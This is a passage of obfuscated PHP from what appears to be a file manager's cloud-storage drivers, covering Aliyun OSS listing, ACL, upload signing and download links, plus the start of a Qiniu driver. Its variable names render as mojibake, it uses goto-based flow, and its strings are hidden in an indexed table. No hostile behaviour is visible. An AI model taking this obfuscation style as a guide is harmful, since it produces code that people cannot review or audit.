rtrim($aô¸­ìâØ, $FÔ‰¼¦Ûßù[8]) . $FÔ‰¼¦Ûßù[8]; $e©“Ü·åù¨ = $this->objectMeta($aô¸­ìâØ); if (!$e©“Ü·åù¨) { return $dÂŒÔïçá°; } $eÃ½”ùïÖİ = array($FÔ‰¼¦Ûßù[187] => $e©“Ü·åù¨[$FÔ‰¼¦Ûßù[1196]][$FÔ‰¼¦Ûßù[1197]], $FÔ‰¼¦Ûßù[107] => strtotime($e©“Ü·åù¨[$FÔ‰¼¦Ûßù[1194]])); } if (isset($eÃ½”ùïÖİ[$FÔ‰¼¦Ûßù[107]])) { $dÂŒÔïçá°[$FÔ‰¼¦Ûßù[107]] = $eÃ½”ùïÖİ[$FÔ‰¼¦Ûßù[107]]; } if (isset($eÃ½”ùïÖİ[$FÔ‰¼¦Ûßù[187]])) { $dÂŒÔïçá°[$FÔ‰¼¦Ûßù[187]] = $eÃ½”ùïÖİ[$FÔ‰¼¦Ûßù[187]]; } return $dÂŒÔïçá°; } public function listPath($d”öŒËî·”, $F¹Í…‰Ñ²ª = false) { $CïÜä„ğƒá =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B›ßªÒ‹’ = $this->fileList($d”öŒËî·”, $CïÜä„ğƒá[8], !0); foreach ($B›ßªÒ‹’[$CïÜä„ğƒá[74]] as $F¨ç†ò÷ä => $A´‰¼éè¦ø) { $B›ßªÒ‹’[$CïÜä„ğƒá[74]][$F¨ç†ò÷ä] = $this->folderInfo($A´‰¼éè¦ø, $A´‰¼éè¦ø); } foreach ($B›ßªÒ‹’[$CïÜä„ğƒá[73]] as $F¨ç†ò÷ä => $A´‰¼éè¦ø) { $B›ßªÒ‹’[$CïÜä„ğƒá[73]][$F¨ç†ò÷ä] = $this->fileInfo($A´‰¼éè¦ø[$CïÜä„ğƒá[28]], $A´‰¼éè¦ø); } return $B›ßªÒ‹’; } public function has($d©õŠ¼êâ, $D“×ªŠ‡åØ = false, $B©ƒ¸¥‰ï† = true) { goto aïñÜå¥í‹; aïñÜå¥í‹: $aŠÎ¥Ø“±¶ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d©õŠ¼êâ = trim($d©õŠ¼êâ, $aŠÎ¥Ø“±¶[8]); $D¬œè¿ÃĞÃ = empty($d©õŠ¼êâ) ? $aŠÎ¥Ø“±¶[33] : $d©õŠ¼êâ . $aŠÎ¥Ø“±¶[8]; goto CğŠÙ‹©¡é; F›¤±›¡°›: return !1; goto cªæöœàĞˆ; CğŠÙ‹©¡é: $Dİˆ­»È«Ù = $aŠÎ¥Ø“±¶[33]; $a‹†ĞçÏïß = 500; $A¶Š×çŠéò = 0; goto FİŒÄ‰“Í; FİŒÄ‰“Í: $E°¨”øà›ø = 0; while (!0) { $bšŒÄŠõë… = array($aŠÎ¥Ø“±¶[1185] => $aŠÎ¥Ø“±¶[8], $aŠÎ¥Ø“±¶[186] => $D¬œè¿ÃĞÃ, $aŠÎ¥Ø“±¶[1186] => $a‹†ĞçÏïß, $aŠÎ¥Ø“±¶[1187] => $Dİˆ­»È«Ù); try { $F¡¼±£È­™ = $this->client->listObjects($this->bucket, $bšŒÄŠõë…); } catch (OSS\Core\OssException $dïæ‹˜ãöä) { break; } $Dİˆ­»È«Ù = $F¡¼±£È­™->getNextMarker(); $EÊ¬¡Û¿ËÊ = $F¡¼±£È­™->getObjectList(); $fáñóµÑß¿ = $F¡¼±£È­™->getPrefixList(); if ($D“×ªŠ‡åØ) { if (count($EÊ¬¡Û¿ËÊ) > 1 || count($EÊ¬¡Û¿ËÊ) == 1 && $EÊ¬¡Û¿ËÊ[0]->getKey() != $D¬œè¿ÃĞÃ) { $A¶Š×çŠéò += count($EÊ¬¡Û¿ËÊ) - 1; } if (!empty($fáñóµÑß¿)) { $E°¨”øà›ø += count($fáñóµÑß¿); } if ($Dİˆ­»È«Ù === $aŠÎ¥Ø“±¶[33]) { break; } continue; } if ($B©ƒ¸¥‰ï†) { if (!empty($EÊ¬¡Û¿ËÊ)) { if (count($EÊ¬¡Û¿ËÊ) > 1 || $EÊ¬¡Û¿ËÊ[0]->getKey() != $D¬œè¿ÃĞÃ) { return !0; } } } else { if (!empty($fáñóµÑß¿)) { return !0; } } if ($Dİˆ­»È«Ù === $aŠÎ¥Ø“±¶[33]) { break; } } if ($D“×ªŠ‡åØ) { return array($aŠÎ¥Ø“±¶[191] => $A¶Š×çŠéò, $aŠÎ¥Ø“±¶[192] => $E°¨”øà›ø); } goto F›¤±›¡°›; cªæöœàĞˆ: } public function listAll($d­Ã´ ÒÔ) { $Dè«»É¾Û¡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DìÄÅñÆùğ = $this->fileList($d­Ã´ ÒÔ, $Dè«»É¾Û¡[33], !0); $CîÎÆ®Ø”µ = array(); foreach ($DìÄÅñÆùğ[$Dè«»É¾Û¡[73]] as $eº¯ÖÛÙ¼) { $CîÎÆ®Ø”µ[$eº¯ÖÛÙ¼[$Dè«»É¾Û¡[28]]] = $eº¯ÖÛÙ¼[$Dè«»É¾Û¡[77]]; } return $this->listAllFiles($d­Ã´ ÒÔ, array_keys($CîÎÆ®Ø”µ), $CîÎÆ®Ø”µ); } public function canRead($b¦øùíè¥) { $F²Õå•óØ¯ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BŒ¿Î¬ÄÃ = $this->pathAcl($b¦øùíè¥); return $BŒ¿Î¬ÄÃ == $F²Õå•óØ¯[1198] || $BŒ¿Î¬ÄÃ == $F²Õå•óØ¯[493] ? !0 : !1; } public function canWrite($fì•Õ½ ‰) { $eÈÛ‹‘Û¾… = $this->pathAcl($fì•Õ½ ‰); return $eÈÛ‹‘Û¾… == $_SERVER[´Ù×Íå‘ÄõÛ][493] ? !0 : !1; } public function pathAcl($d’ÜÊâãÚç) { goto f¡óˆ¯‚Õ×; eïõ„¸Ïİ: $eá–ø”®‘ = $a¡µ…ÏâÃ == $c£ò¬´êøó[34] ? $this->bucketAcl : $a¡µ…ÏâÃ; if ($eá–ø”®‘ == $c£ò¬´êøó[1199]) { return $c£ò¬´êøó[1198]; } if ($eá–ø”®‘ == $c£ò¬´êøó[1200]) { return $c£ò¬´êøó[493]; } goto aÑ‰Ëî¾; aÑ‰Ëî¾: return $eá–ø”®‘; goto D‘À‹šÅ×Û; f¡óˆ¯‚Õ×: $c£ò¬´êøó =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $a¡µ…ÏâÃ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($d’ÜÊâãÚç)); } catch (OSS\Core\OssException $B®´§¹·¿) { return !1; } goto eïõ„¸Ïİ; D‘À‹šÅ×Û: } private function chmodPath($Cæë†Ê›É, $A‹İÍ›ªò = '') { $D¯à‰Ü´»ƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fÒÒ²Ÿ = empty($A‹İÍ›ªò) ? $D¯à‰Ü´»ƒ[1200] : $A‹İÍ›ªò; $båÑ–ãæ = array($D¯à‰Ü´»ƒ[34], $D¯à‰Ü´»ƒ[185], $D¯à‰Ü´»ƒ[1199], $D¯à‰Ü´»ƒ[1200]); if (!in_array($fÒÒ²Ÿ, $båÑ–ãæ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Cæë†Ê›É), $fÒÒ²Ÿ); } catch (OSS\Core\OssException $dÚÚ’è½) { return !1; } return !0; } public function getContent($Aß¬ò»Óøó) { return $this->fileSubstr($Aß¬ò»Óøó, -1); } public function setContent($aè¨«›çòŠ, $FùŸã˜†› = '') { $D«Î‘Ãùõ =& $_SERVER[´Ù×Íå‘ÄõÛ]; try { $eÄ·¹õìµñ = $this->trafficLimit($D«Î‘Ãùõ[1201]); $cé¢™‰æÂ• = $this->client->putObject($this->bucket, $this->pathEncode($aè¨«›çòŠ), $FùŸã˜†›, $eÄ·¹õìµñ); } catch (OSS\Core\OssException $d•…ÓøÉĞ•) { return !1; } $e×Ö¬å˜Öæ = array($D«Î‘Ãùõ[1188] => trim($cé¢™‰æÂ•[$D«Î‘Ãùõ[1202]], $D«Î‘Ãùõ[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($aè¨«›çòŠ))); $this->updateObjMeta($aè¨«›çòŠ, $e×Ö¬å˜Öæ); return isset($cé¢™‰æÂ•[$D«Î‘Ãùõ[1203]][$D«Î‘Ãùõ[1150]]) ? (int) $cé¢™‰æÂ•[$D«Î‘Ãùõ[1203]][$D«Î‘Ãùõ[1150]] : strlen($cé¢™‰æÂ•); } private function updateObjMeta($eßëé“éŒ, $cƒğ†ÊÙ) { $eßëé“éŒ = $this->pathEncode($eßëé“éŒ); try { $aÂ†ã²š¥ = array(OSS\OssClient::OSS_HEADERS => $cƒğ†ÊÙ); $this->client->copyObject($this->bucket, $eßëé“éŒ, $this->bucket, $eßëé“éŒ, $aÂ†ã²š¥); } catch (OSS\Core\OssException $e„î¼£Ñ‚) { return !1; } return !0; } public function upload($a¶ŸøšÏÖ•, $Cï†ªíßŠæ, $C‹¡¾“ = false, $cåÒ“©ğ» = REPEAT_REPLACE) { $AŠÛõËÅ¡š =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bèìÃğîÅ± = trim($a¶ŸøšÏÖ•, $AŠÛõËÅ¡š[8]); $f·ô«ŞÑŸ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($AŠÛõËÅ¡š[1188] => @md5_file($Cï†ªíßŠæ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($a¶ŸøšÏÖ•))); $f·ô«ŞÑŸ = $this->trafficLimit($AŠÛõËÅ¡š[1201], $f·ô«ŞÑŸ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($bèìÃğîÅ±), $Cï†ªíßŠæ, $f·ô«ŞÑŸ); } catch (OSS\Core\OssException $aˆÀÉã®Ë) { return !1; } return $this->getPathOuter($a¶ŸøšÏÖ•); } public function getHost() { $AÛ›Ä—ŠŸÕ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eÕÌ–ºùÑÜ = explode($AÛ›Ä—ŠŸÕ[171], parent::getHost()); return $eÕÌ–ºùÑÜ[0] . $AÛ›Ä—ŠŸÕ[171] . $this->bucket . $AÛ›Ä—ŠŸÕ[91] . $eÕÌ–ºùÑÜ[1]; } public function uploadFormData($càƒ²İèò, $B‡Áİ£Üóñ = 3600) { goto d±¥Âø¹Çê; B³©„êğ±‡: $EÂ‡·½©Ğå = base64_encode(hash_hmac($eëÛˆ×š…[218], $F“„Î¼ŒÀŸ, $this->secret, !0)); $DÇ°ã‡•ÜÙ = array($eëÛˆ×š…[1116] => $F“„Î¼ŒÀŸ, $eëÛˆ×š…[1207] => $this->accessKey, $eëÛˆ×š…[1112] => $eëÛˆ×š…[1104], $eëÛˆ×š…[1208] => $EÂ‡·½©Ğå, $eëÛˆ×š…[169] => $Cß©—Ú˜¬); $DÇ°ã‡•ÜÙ = $this->trafficLimit($eëÛˆ×š…[1201], $DÇ°ã‡•ÜÙ); goto f®øÎåÆÀ‘; f®øÎåÆÀ‘: return $DÇ°ã‡•ÜÙ; goto aç”âä†ùñ; b·×ª¨“•‚: $EÇÜöŠÕ = strpos($cÉÆ…×é»­, $eëÛˆ×š…[284]); $cÉÆ…×é»­ = substr($cÉÆ…×é»­, 0, $EÇÜöŠÕ) . $eëÛˆ×š…[1205]; $c§«´®Â¨ = 1048576000 * 5; goto fƒ¶ó¹³ùÃ; céùÍÉ“Ğ¡: $f„¼ô±ÖÛ = date($eëÛˆ×š…[1204], time() + $EëÖÄÅ›îé); $F—ôÁ²ŒöĞ = new DateTime($f„¼ô±ÖÛ); $cÉÆ…×é»­ = $F—ôÁ²ŒöĞ->format(DateTime::ISO8601); goto b·×ª¨“•‚; d±¥Âø¹Çê: $eëÛˆ×š… =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!($Cß©—Ú˜¬ = $this->getHost())) { return !1; } $EëÖÄÅ›îé = $B‡Áİ£Üóñ; goto céùÍÉ“Ğ¡; fƒ¶ó¹³ùÃ: $C®Ş½ˆî› = $this->pathFather($càƒ²İèò); $B¼ÖªŒæ„Ÿ = array($eëÛˆ×š…[1106] => $cÉÆ…×é»­, $eëÛˆ×š…[1107] => array(array($eëÛˆ×š…[1206], 0, $c§«´®Â¨), array($eëÛˆ×š…[1110], $eëÛˆ×š…[1111], $C®Ş½ˆî›))); $F“„Î¼ŒÀŸ = base64_encode(json_encode($B¼ÖªŒæ„Ÿ)); goto B³©„êğ±‡; aç”âä†ùñ: } public function multiUploadFormData($E ÜÒ‰Ş¸“, $aÀ±¤Ê†¢Û = 3600) { $f…‡¥Èêƒ’ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!($f´˜ñ•¿” = $this->getHost())) { return !1; } $DÌâšš¯•Ğ = $this->trafficLimit($f…‡¥Èêƒ’[1201]); $fšÎÍ­äğá = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($E ÜÒ‰Ş¸“), $DÌâšš¯•Ğ); return array($f…‡¥Èêƒ’[209] => $fšÎÍ­äğá, $f…‡¥Èêƒ’[169] => $f´˜ñ•¿” . $f…‡¥Èêƒ’[8] . $this->pathEncode($E ÜÒ‰Ş¸“), $f…‡¥Èêƒ’[210] => gmdate($f…‡¥Èêƒ’[1209]), $f…‡¥Èêƒ’[89] => $E ÜÒ‰Ş¸“); } public function multiUploadAuthData($e˜Á©‰îÍĞ, $BÖôîÅ¬Ï = array()) { goto f¬æÔ·Ïœ; bÍ”„™¸º÷: $DÌÙ´ó…ÌÁ = array($FÚµ È‡ŒÒ[212], $FÚµ È‡ŒÒ[33], $FÚµ È‡ŒÒ[116], $b„óœ äß„, "\x78\x2d\157\x73\x73\55\x64\141\164\145\x3a{$b„óœ äß„}", $FÚµ È‡ŒÒ[8] . $this->bucket . $FÚµ È‡ŒÒ[8] . $aß¦ ­Å…ó . $báÄŞâõ¸Œ); if (strpos($báÄŞâõ¸Œ, $FÚµ È‡ŒÒ[213]) === 0) { $DÌÙ´ó…ÌÁ[0] = $FÚµ È‡ŒÒ[214]; if ($bĞÆÌƒÁÚ = $this->trafficLimit($FÚµ È‡ŒÒ[1201])) { $aß¦ ­Å…ó = $FÚµ È‡ŒÒ[1210]; array_splice($DÌÙ´ó…ÌÁ, 5, 0, $aß¦ ­Å…ó . $FÚµ È‡ŒÒ[4] . $bĞÆÌƒÁÚ[$aß¦ ­Å…ó]); } } if (isset($BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[215]]) && $BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[215]] == $FÚµ È‡ŒÒ[216]) { $DÌÙ´ó…ÌÁ[0] = $FÚµ È‡ŒÒ[216]; } goto dê‘›‹‡´; AÌâçèñ: $aß¦ ­Å…ó = $e˜Á©‰îÍĞ; if (isset($BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[89]])) { $aß¦ ­Å…ó = $BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[89]]; unset($BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[89]]); } if (isset($BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[211]])) { $BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[210]] = $b„óœ äß„; return $this->listUploadParts($aß¦ ­Å…ó, $BÖôîÅ¬Ï); } goto bÍ”„™¸º÷; F ´†Ê‘«: $a’Êœ‰©Ü = $FÚµ È‡ŒÒ[1212] . $this->accessKey . $FÚµ È‡ŒÒ[4] . $cÆÇ‹Ö¦ëÃ; if (strpos($báÄŞâõ¸Œ, $FÚµ È‡ŒÒ[213]) === 0) { $a’Êœ‰©Ü = array($FÚµ È‡ŒÒ[220] => $a’Êœ‰©Ü, $FÚµ È‡ŒÒ[210] => $b„óœ äß„); if ($bĞÆÌƒÁÚ) { $a’Êœ‰©Ü = array_merge($a’Êœ‰©Ü, $bĞÆÌƒÁÚ); } } return $a’Êœ‰©Ü; goto d½ŠÖ³ÌÃ; dê‘›‹‡´: if (!empty($BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[1211]])) { $B—ƒ˜â÷–Ô = array_merge(array($DÌÙ´ó…ÌÁ[4]), $BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[1211]]); sort($B—ƒ˜â÷–Ô); $DÌÙ´ó…ÌÁ[4] = implode($FÚµ È‡ŒÒ[217], $B—ƒ˜â÷–Ô); } $D•¹ŸÀé¾Œ = implode($FÚµ È‡ŒÒ[217], $DÌÙ´ó…ÌÁ); $cÆÇ‹Ö¦ëÃ = base64_encode(hash_hmac($FÚµ È‡ŒÒ[218], $D•¹ŸÀé¾Œ, $this->secret, !0)); goto F ´†Ê‘«; f¬æÔ·Ïœ: $FÚµ È‡ŒÒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b„óœ äß„ = isset($BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[210]]) ? $BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[210]] : gmdate($FÚµ È‡ŒÒ[1209]); $báÄŞâõ¸Œ = isset($BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[160]]) ? $BÖôîÅ¬Ï[$FÚµ È‡ŒÒ[160]] : $FÚµ È‡ŒÒ[33]; goto AÌâçèñ; d½ŠÖ³ÌÃ: } public function listUploadParts($D•®©é‡¢¾, $dˆ†ä‰‚ä) { goto fæİôä®ÌŸ; eÊÎÛ«˜„Û: $c“¬†·çŸì = $AÏùôğ­í¹->getListPart(); $FøÈ¡ÓéÌÇ = array(); foreach ($c“¬†·çŸì as $B»™ˆ¡–¤) { $FøÈ¡ÓéÌÇ[] = array($A’ğÄ·Üš[1192] => $B»™ˆ¡–¤->getPartNumber(), $A’ğÄ·Üš[1193] => trim($B»™ˆ¡–¤->getETag(), $A’ğÄ·Üš[113])); } goto eµãÎÕ‘Â‹; fæİôä®ÌŸ: $A’ğÄ·Üš =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C­‡ãä°õ¦ = parse_url_query($dˆ†ä‰‚ä[$A’ğÄ·Üš[160]]); $AÏùôğ­í¹ = $this->client->listParts($this->bucket, $this->pathEncode($D•®©é‡¢¾), $C­‡ãä°õ¦[$A’ğÄ·Üš[209]]); goto eÊÎÛ«˜„Û; e‰¨´²¹: return array($A’ğÄ·Üš[220] => $cÊïÁîß÷–, $A’ğÄ·Üš[210] => $dˆ†ä‰‚ä[$A’ğÄ·Üš[210]], $A’ğÄ·Üš[222] => $FøÈ¡ÓéÌÇ); goto D¹¡£†¼¶ ; eµãÎÕ‘Â‹: unset($dˆ†ä‰‚ä[$A’ğÄ·Üš[211]], $dˆ†ä‰‚ä[$A’ğÄ·Üš[215]]); $cÊïÁîß÷– = $this->multiUploadAuthData($D•®©é‡¢¾, $dˆ†ä‰‚ä); if (empty($cÊïÁîß÷–)) { return !1; } goto e‰¨´²¹; D¹¡£†¼¶ : } public function download($CŠ¶ªˆùŞ˜, $c¨ùØ½ˆ•Ù) { if ($this->isFolder($CŠ¶ªˆùŞ˜)) { return !1; } try { $B¹½¨íËØè = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $c¨ùØ½ˆ•Ù); $B¹½¨íËØè = $this->trafficLimit($_SERVER[´Ù×Íå‘ÄõÛ][105], $B¹½¨íËØè); $this->client->getObject($this->bucket, $this->pathEncode($CŠ¶ªˆùŞ˜), $B¹½¨íËØè); } catch (OSS\Core\OssException $bğíÓØ·™) { return !1; } return $c¨ùØ½ˆ•Ù; } public function fileSubstr($B„‹ƒÒÃ‡, $A®Áà‚æŸ‡ = 0, $C™„©Ï¶Ÿª = false) { if ($A®Áà‚æŸ‡ === -1) { $D‚šË÷’ = array(); } else { if ($C™„©Ï¶Ÿª === !1) { $D“Ö‚¹¥™Š = $this->size($B„‹ƒÒÃ‡); } else { $D“Ö‚¹¥™Š = $A®Áà‚æŸ‡ + $C™„©Ï¶Ÿª - 1; } $D‚šË÷’ = array(OSS\OssClient::OSS_RANGE => "{$A®Áà‚æŸ‡}\55{$D“Ö‚¹¥™Š}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($B„‹ƒÒÃ‡), $D‚šË÷’); } catch (OSS\Core\OssException $dö™…õã¬) { think_exception($dö™…õã¬->getMessage()); return !1; } } private function trafficLimit($Fåé‘Ğê¼©, $D•ò‡Ÿ¨Ù = array()) { goto cçãî¦Öø¢; CË¥¾Ç»²ó: if (!$C÷÷Çä‘†) { return $D•ò‡Ÿ¨Ù; } $C÷÷Çä‘† = $C÷÷Çä‘† < 819200 ? 819200 : ($C÷÷Çä‘† > 838860800 ? 838860800 : $C÷÷Çä‘†); $D•ò‡Ÿ¨Ù[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($C÷÷Çä‘†); goto fÇíÎ¡ìŒä; cçãî¦Öø¢: $eÚ©×›“ñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($Fåé‘Ğê¼© == $eÚ©×›“ñ[1201] && $this->isUploadServer() || $Fåé‘Ğê¼© == $eÚ©×›“ñ[105] && $this->isFileOutServer()) { return $D•ò‡Ÿ¨Ù; } $C÷÷Çä‘† = floatval($GLOBALS[$eÚ©×›“ñ[6]][$eÚ©×›“ñ[84]][$eÚ©×›“ñ[103]][$Fåé‘Ğê¼©]) * 1024 * 1024 * 8; goto CË¥¾Ç»²ó; fÇíÎ¡ìŒä: return $D•ò‡Ÿ¨Ù; goto eÊÉ³ŞÅ¢®; eÊÉ³ŞÅ¢®: } public function link($F‘ãÃªÇ, $C¾ŠÁœÈïŞ = array()) { $F†¶›’Á¶° =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->exist($F‘ãÃªÇ) || $this->isFolder($F‘ãÃªÇ)) { return !1; } try { $C¾ŠÁœÈïŞ = $this->trafficLimit($F†¶›’Á¶°[105], $C¾ŠÁœÈïŞ); $E¼†™£°í = $this->client->signUrl($this->bucket, $this->pathEncode($F‘ãÃªÇ), 3600 * 12, $F†¶›’Á¶°[216], $C¾ŠÁœÈïŞ); return $this->getCdnLink($E¼†™£°í); } catch (OSS\Core\OssException $D —ã•‹†—) { return !1; } } public function fileOut($AÔƒìö¸Ù¶, $bÚËñÚìå = false, $a™”´®öœå = false, $dëá»Š… = '') { goto D†ÖëÑÉ„†; Eèà§ö…•ç: $cÁ£·¼¶„‡ = $this->link($AÔƒìö¸Ù¶, $c¯‡‚–¸´); $this->fileOutLink($cÁ£·¼¶„‡); goto FÍã”ÆŞÏã; BŸ¥ÂêŒµ›: $bÚËñÚìå = $bÚËñÚìå ? $cíóÇí°Ù[202] : $cíóÇí°Ù[203]; $c¯‡‚–¸´ = array(OSS\OssClient::OSS_SUB_RESOURCE => $cíóÇí°Ù[1213] . rawurlencode("{$bÚËñÚìå}\x3b\x66\151\x6c\x65\x6e\141\x6d\145\75{$a™”´®öœå}")); $c¯‡‚–¸´[OSS\OssClient::OSS_SUB_RESOURCE] .= $cíóÇí°Ù[1214] . rawurlencode($C•¦éÛï£›); goto Eèà§ö…•ç; D†ÖëÑÉ„†: $cíóÇí°Ù =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->isFileOutServer()) { return $this->fileOutServer($AÔƒìö¸Ù¶, $bÚËñÚìå, $a™”´®öœå, $dëá»Š…); } if (!$a™”´®öœå) { $a™”´®öœå = $this->pathThis($AÔƒìö¸Ù¶); } goto eï»†ÎÈ°; eï»†ÎÈ°: $a™”´®öœå = rawurlencode($a™”´®öœå); $C•¦éÛï£› = get_file_mime(get_path_ext($a™”´®öœå)); if ($C•¦éÛï£› == $cíóÇí°Ù[201]) { return parent::fileOut($AÔƒìö¸Ù¶, $bÚËñÚìå, $a™”´®öœå, $dëá»Š…); } goto BŸ¥ÂêŒµ›; FÍã”ÆŞÏã: } public function fileOutServer($Eíİî™™›±, $D­¤®ôÄ¹‚ = false, $AºèÓª‡²ê = false, $f•º·§™å = '') { parent::fileOut($Eíİî™™›±, $D­¤®ôÄ¹‚, $AºèÓª‡²ê, $f•º·§™å); } public function fileOutImage($Fâ‹Óğó™Ó, $A¦ƒŠŠîÜ¦ = 250) { $e¸ñ“äàÅÖ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[´Ù×Íå‘ÄõÛ][1215] . $A¦ƒŠŠîÜ¦); $eæ„ï ¥ºÅ = $this->link($Fâ‹Óğó™Ó, $e¸ñ“äàÅÖ); $this->fileOutLink($eæ„ï ¥ºÅ); } public function fileOutImageServer($AêË—Êô‡½, $fµïĞ˜ç½ = 250) { parent::fileOutImage($AêË—Êô‡½, $fµïĞ˜ç½); } public function fileOutLink($BÈè¬éÍ‰Ì) { $EÎ¬ƒÌ¤Á =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->isCdnHost() && substr($BÈè¬éÍ‰Ì, 0, 7) == $EÎ¬ƒÌ¤Á[1119]) { $BÈè¬éÍ‰Ì = $EÎ¬ƒÌ¤Á[1120] . substr($BÈè¬éÍ‰Ì, 7); } header($EÎ¬ƒÌ¤Á[156] . $BÈè¬éÍ‰Ì); die; } public function hashMd5($D¬ƒ¨³ÊÂğ, $B½ä†“Ìáø = '') { $Aìò¿Îøˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a­ãøõî³› = $this->objectMeta($D¬ƒ¨³ÊÂğ); if (!$a­ãøõî³›) { return $Aìò¿Îøˆ[33]; } if (!isset($a­ãøõî³›[$Aìò¿Îøˆ[1188]]) && !empty($B½ä†“Ìáø)) { $f÷šÜÇÄ¤Œ = $this->updateObjMeta($D¬ƒ¨³ÊÂğ, array($Aìò¿Îøˆ[1188] => $B½ä†“Ìáø)); $a­ãøõî³›[$Aìò¿Îøˆ[1188]] = $f÷šÜÇÄ¤Œ ? $B½ä†“Ìáø : $Aìò¿Îøˆ[33]; } return isset($a­ãøõî³›[$Aìò¿Îøˆ[1188]]) ? strtolower($a­ãøõî³›[$Aìò¿Îøˆ[1188]]) : $Aìò¿Îøˆ[33]; } public function size($cƒ†ƒÓ§å) { $DÎ¨¸ï›Šƒ = $this->objectMeta($cƒ†ƒÓ§å); return $DÎ¨¸ï›Šƒ ? $DÎ¨¸ï›Šƒ[$_SERVER[´Ù×Íå‘ÄõÛ][77]] : 0; } public function info($d±‘Á¯ÎŸß) { if ($this->isFolder($d±‘Á¯ÎŸß)) { return $this->folderInfo($d±‘Á¯ÎŸß); } else { if ($this->isFile($d±‘Á¯ÎŸß)) { return $this->fileInfo($d±‘Á¯ÎŸß); } } return !1; } public function exist($BÈ‚Œ¥Šİß) { return $this->isFile($BÈ‚Œ¥Šİß) || $this->isFolder($BÈ‚Œ¥Šİß); } public function isFile($b™åÃ¥Í¼Ï) { return !$this->isFolder($b™åÃ¥Í¼Ï) && $this->objectMeta($b™åÃ¥Í¼Ï); } public function isFolder($Bª·ŒíŒ·š) { return $this->cacheMethod($_SERVER[´Ù×Íå‘ÄõÛ][223], $Bª·ŒíŒ·š); } protected function objectMeta($BàÔå•Ú°) { return $this->cacheMethod($_SERVER[´Ù×Íå‘ÄõÛ][224], $BàÔå•Ú°); } protected function _objectMeta($BÑ„ƒ¶¹®Ú) { $Dë¶›¢à× =& $_SERVER[´Ù×Íå‘ÄõÛ]; try { $bæŒÄ‹¢Š· = $this->client->getObjectMeta($this->bucket, $this->pathEncode($BÑ„ƒ¶¹®Ú)); } catch (OSS\Core\OssException $c˜Õ©ºŒšÍ) { $bæŒÄ‹¢Š· = !1; } if ($bæŒÄ‹¢Š·) { $bæŒÄ‹¢Š·[$Dë¶›¢à×[77]] = intval($bæŒÄ‹¢Š·[$Dë¶›¢à×[1195]]); } return $bæŒÄ‹¢Š·; } protected function _isFolder($f‡’®ã‰½) { $bºíÍß‚²ö =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($f‡’®ã‰½ == $bºíÍß‚²ö[33] || $f‡’®ã‰½ == $bºíÍß‚²ö[8]) { return !0; } $Bó·‡ÄñÕ = array($bºíÍß‚²ö[1185] => $bºíÍß‚²ö[8], $bºíÍß‚²ö[186] => rtrim($f‡’®ã‰½, $bºíÍß‚²ö[8]) . $bºíÍß‚²ö[8], $bºíÍß‚²ö[1186] => 1, $bºíÍß‚²ö[1187] => $bºíÍß‚²ö[33]); $D¿Ÿ¡í¦½‡ = $this->client->listObjects($this->bucket, $Bó·‡ÄñÕ); if ($D¿Ÿ¡í¦½‡->getObjectList() || $D¿Ÿ¡í¦½‡->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($C–çê¾‰¹) { parent::__construct(); require_once SDK_DIR . $_SERVER[´Ù×Íå‘ÄõÛ][1216]; $this->_init($C–çê¾‰¹); } public function _init($d‚ÆôÊ) { foreach ($d‚ÆôÊ as $D·î½¾Í—Ô => $A¯§”°î„ã) { if (isset($this->{$D·î½¾Í—Ô})) { $this->{$D·î½¾Í—Ô} = $A¯§”°î„ã; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[´Ù×Íå‘ÄõÛ][1217], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function 